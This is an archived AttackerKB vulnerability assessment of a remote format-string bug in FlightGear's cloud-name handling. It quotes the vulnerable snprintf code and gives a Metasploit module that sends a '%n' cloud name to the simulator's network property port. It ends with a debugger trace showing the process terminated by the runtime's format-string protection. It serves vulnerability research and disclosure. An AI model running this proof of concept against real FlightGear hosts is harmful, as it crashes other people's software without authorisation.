---
title: FlightGear flightgear/src/Environment/fgclouds.cxx Cloud Name Handling Remote Format String
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
created: '2019-09-12T18:07:52.270787'
revision_date: '2020-02-13T17:12:09.042757'
assessment_id: 107e4e64-c89e-4b88-97b7-0b612a19edb6
topic_id: fcf27bcc-b246-4bcf-93b4-562af2ef234d
topic_short_id: XzOqvbeWCq
topic_slug: flightgear-flightgear-src-environment-fgclouds-cxx-cloud-name-handling-remote-format-string
akb_topic_url: https://attackerkb.com/topics/XzOqvbeWCq/flightgear-flightgear-src-environment-fgclouds-cxx-cloud-name-handling-remote-format-string
akb_assessment_url: https://attackerkb.com/topics/XzOqvbeWCq/flightgear-flightgear-src-environment-fgclouds-cxx-cloud-name-handling-remote-format-string#107e4e64-c89e-4b88-97b7-0b612a19edb6
---

# FlightGear flightgear/src/Environment/fgclouds.cxx Cloud Name Handling Remote Format String

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/XzOqvbeWCq/flightgear-flightgear-src-environment-fgclouds-cxx-cloud-name-handling-remote-format-string#107e4e64-c89e-4b88-97b7-0b612a19edb6).*

---

* Vuln analysis:

In source code:

```
  double count = acloud->getDoubleValue("count", 1.0);
    tCloudVariety[CloudVarietyCount].count = count;
    int variety = 0;
    cloud_name = cloud_name + "-%d";
    char variety_name[50];
    do {
         variety++;
         snprintf(variety_name, sizeof(variety_name) - 1, cloud_name.c_str(), variety); // Vulnerable snprintf
    } while( box_def_root->getChild(variety_name, 0, false) );
    totalCount += count;
    if( CloudVarietyCount < 20 )
         CloudVarietyCount++;
  }
}

totalCount = 1.0 / totalCount;
```

* PoC:

```
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FlightGear Format String',
      'Description'    => %q{
          This module exploits .....
      },
      'Author'         => [ 'juan vazquez' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '92872' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00\x20\x0a\x0d",
          'DisableNops'  =>  'true',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'FlightGear',   { 'Ret' => 0x41414141 } ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Apr 21 2013'))

    register_options([Opt::RPORT(5501)], self.class)
  end

  def exploit
    connect

    print_status("Trying to send data...")

    sock.put("data\r\n")
    sock.put("set /sim/rendering/clouds3d-enable true\r\n")
    sock.put("set /environment/clouds\r\n")
    sock.put("set /environment/cloudlayers/layers[0]/cu/cloud/name %n\r\n")
    sock.put("set /environment/clouds/layer[0]/coverage cirrus\r\n")
    sock.put("quit\r\n")

    disconnect
  end

end
```


* Crash Analysis

On the WIN32 version available here: http://mirrors.ibiblio.org/flightgear/ftp/Windows/Setup%20FlightGear%202.10.0.3.exe

MSVCR100 is used by FlightGear 2.10.0.3, which looks like coming with FormatString Exploitation Protection:

```
Breakpoint 0 hit
eax=013dfcc4 ebx=022b0ce0 ecx=013df950 edx=00000002 esi=00000001 edi=013df9c4
eip=004a241e esp=013df8f4 ebp=013dfd08 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200287
fgfs+0xa241e:
004a241e ff1550e48b00    call    dword ptr [fgfs!std::_Init_locks::operator=+0x6e189 (008be450)] ds:0023:008be450={MSVCR100!_snprintf (78b05c8a)}
0:000> dd esp
013df8f4  013dfcc4 00000031 013df988 00000001
013df904  98706bbe 00000010 00000000 0000000f
013df914  00000000 3ff00000 00000000 00000000
013df924  023827c8 00000000 00000000 022a5b10
013df934  02479808 0089b0b0 00000000 022acfe0
013df944  00000000 00000000 0230dfd0 252d6e00
013df954  00000064 021706e8 02170000 00000000
013df964  0000000f 0223fa40 013dfb98 7c90e900
0:000> db 013df988
013df988  25 6e 2d 25 64 00 17 24-03 00 00 00 f8 51 24 02  %n-%d..$.....Q$.
013df998  05 00 00 00 0f 00 00 00-15 09 8d 00 25 6e 00 00  ............%n..
013df9a8  00 00 00 00 7e 6f 70 98-00 00 00 00 02 00 00 00  ....~op.........
013df9b8  0f 00 00 00 f0 f9 3d 01-b8 ac 89 00 00 00 00 00  ......=.........
013df9c8  00 00 f0 3f 00 10 7e 00-15 09 8d 00 1b 09 8d 00  ...?..~.........
013df9d8  00 00 00 00 00 00 00 00-0f 00 00 00 00 00 00 00  ................
013df9e8  a8 f9 23 02 80 fc 3d 01-c4 fa 3d 01 00 af 89 00  ..#...=...=.....
013df9f8  be 6c 70 98 c4 fa 3d 01-b0 b0 89 00 00 00 00 00  .lp...=.........
0:000> p
WARNING: Step/trace thread exited
eax=7ffd9000 ebx=013df98a ecx=013df010 edx=7c90e4f4 esi=c0000417 edi=013df900
eip=7c90e4f4 esp=013df5c0 ebp=013df5d0 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200286
ntdll!KiFastSystemCallRet:
7c90e4f4 c3              ret
0:000> kb
ChildEBP RetAddr  Args to Child
013df5bc 7c90de5c 7c801e3a ffffffff c0000417 ntdll!KiFastSystemCallRet
013df5c0 7c801e3a ffffffff c0000417 013df5fc ntdll!NtTerminateProcess+0xc
013df5d0 78b2af4f ffffffff c0000417 00000001 kernel32!TerminateProcess+0x20
013df5e0 78b2af7d 00000000 00000000 00000000 MSVCR100!_invoke_watson+0x23
013df5fc 78b2af8a 00000000 00000000 00000000 MSVCR100!_invalid_parameter+0x2c
013df614 78b1c7a3 013df8ec 013dfcc4 00000000 MSVCR100!_invalid_parameter_noinfo+0xc
013df8a8 78b05d0e 013df8cc 013df988 00000000 MSVCR100!_output_l+0x86
013df8ec 004a2424 013dfcc4 00000031 013df988 MSVCR100!_snprintf+0x84
WARNING: Stack unwind information not available. Following frames may be wrong.
013dfd08 004a2a3c 00000000 013dfd90 00000000 fgfs+0xa2424
013dfdbc 004a2aed 013dfdfc 0049ed0a 00000004 fgfs+0xa2a3c
013dfdc4 0049ed0a 00000004 00000004 0c0a3b88 fgfs+0xa2aed
013dfdfc 007ec98b 7d035c41 3ff4c78a 98706882 fgfs+0x9ed0a
013dfe34 007ec87a 00000000 3ff00000 00000005 fgfs+0x3ec98b
013dfe78 007ec432 00000000 3ff00000 008c4230 fgfs+0x3ec87a
013dfe90 004196ef 00000000 3ff00000 00000000 fgfs+0x3ec432
013dfeb0 0067d769 98706862 008c4230 0222abc0 fgfs+0x196ef
013dfed4 0041a067 987069aa 0222abc0 00000004 fgfs+0x27d769
013dff1c 00402082 00000004 0222abc0 987069ca fgfs+0x1a067
013dff7c 00850cb3 00000004 0222abc0 02172ee8 fgfs+0x2082
013dffc0 7c817067 217bc3f4 01cec380 7ffd9000 fgfs!std::_Init_locks::operator=+0x9ec
013dfff0 00000000 00850dd4 00000000 00905a4d kernel32!BaseProcessStart+0x23
```
